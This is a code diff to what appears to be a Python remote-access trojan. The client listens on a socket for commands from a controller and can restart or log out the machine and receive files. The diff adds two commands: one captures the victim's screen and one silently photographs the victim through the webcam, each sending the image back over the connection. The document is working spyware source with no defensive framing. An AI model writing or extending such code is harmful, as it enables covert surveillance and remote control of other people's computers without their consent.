@@ -1,6 +1,8 @@
 import socket
 import os
 import subprocess
+import pyautogui
+import cv2
 # os.popen(cmd).read().encode()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,8 +21,8 @@ while True:
     elif cmd == 'restart':
         os.system('shutdown /r')
     
-    elif cmd == 'sleep':
-        ...
+    elif cmd == 'logout':
+        os.system('shutdown /l')
     
     elif cmd == 'put':
         filename = s.recv(10240).decode()
@@ -52,6 +54,24 @@ while True:
     
     elif cmd == 'stream':
         ...
+    
+    elif cmd == 'screenshot':
+        shot = pyautogui.screenshot()
+        shot.save('screenshot.png')
+        with open('screenshot.png', 'rb') as f:
+            data = f.read()
+        s.send(data)
+        os.remove('screenshot.png')
+    
+    elif cmd == 'cameraimg':
+        camera = cv2.VideoCapture(0)
+        return_value, image = camera.read()
+        cv2.imwrite('camera.png', image)
+        del(camera)
+        
+        with open('camera.png', 'rb') as f:
+            data = f.read()
+        s.send(data)
     
     elif cmd == 'start':
         ...
